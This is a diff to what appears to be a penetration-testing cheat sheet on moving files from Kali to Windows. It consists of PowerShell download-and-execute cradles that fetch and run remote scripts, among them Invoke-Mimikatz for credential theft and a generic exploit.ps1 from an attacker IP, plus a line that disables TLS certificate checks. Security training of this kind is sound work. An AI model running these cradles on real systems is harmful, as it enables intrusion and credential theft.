@@ -761,29 +761,29 @@ $ echo <base64_string> | base64 -d > hosts
 $ md5sum hosts 
 ```
 
-- PowerShell DownloadFile
+- PowerShell DownloadFile (Kali -> Windows)
 
 ```
-PS C:\> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
-PS C:\> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP address>:8000/exploit.ps1','C:\Users\Public\Downloads\exploit.ps1')
 ```
 
-- PowerShell Invoke-WebRequest
+- PowerShell Invoke-WebRequest (Kali -> Windows)
 
 ```
-PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-PS C:\> iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing | IEX
+PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
+PS C:\> iwr http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
 
+# Internet Explorer first-launch error
+PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -UseBasicParsing | IEX
+
+# SSL/TLS secure channel error
 PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 ```
 
-- PowerShell DownloadString (Download & Execute Cradle - Fileless)
+- PowerShell DownloadString (Download & Execute Cradle - Fileless) (Kali -> Windows)
 
 ```
-PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://<IP address>:8000/exploit.ps1')
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 ```
 
